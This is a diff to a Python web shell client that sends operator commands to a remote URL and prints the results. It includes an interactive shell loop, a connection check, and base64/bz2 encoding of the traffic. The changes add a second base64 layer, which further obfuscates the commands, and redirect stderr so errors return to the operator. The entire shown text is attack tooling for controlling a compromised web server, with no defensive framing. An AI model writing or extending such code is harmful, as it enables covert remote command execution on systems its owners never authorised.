@@ -19,6 +19,7 @@ def randomstring(n):
 
 def encode(text):
     data = text.encode("ascii")
+    data = b64encode(data)
     data = bz2encode(data, 9)
     data = b64encode(data)
     return data.decode("ascii")
@@ -27,6 +28,7 @@ def decode(text):
     data = text.encode("utf-8")
     data = b64decode(data)
     data = bz2decode(data)
+    data = b64decode(data)
     return data.decode("utf-8")
 
 def req(url, command, session):
@@ -57,7 +59,7 @@ def test_connection(url, session):
     delimeter = randomstring(10)
     command = 'echo -n "%s"' % delimeter
     data, status = req(url, command, session)
-
+    
     if data != delimeter:
         print(CANNOT_CONNECT_PAYLOAD)
         return False
@@ -79,7 +81,7 @@ def shell(url):
             command = input(SHELL_PROMPT)
             if command == "exit":
                 return
-            result, status = req(url, command, s)
+            result, status = req(url, command+" 2>&1", s)
             if status:
                 print(result, end="")
             else:
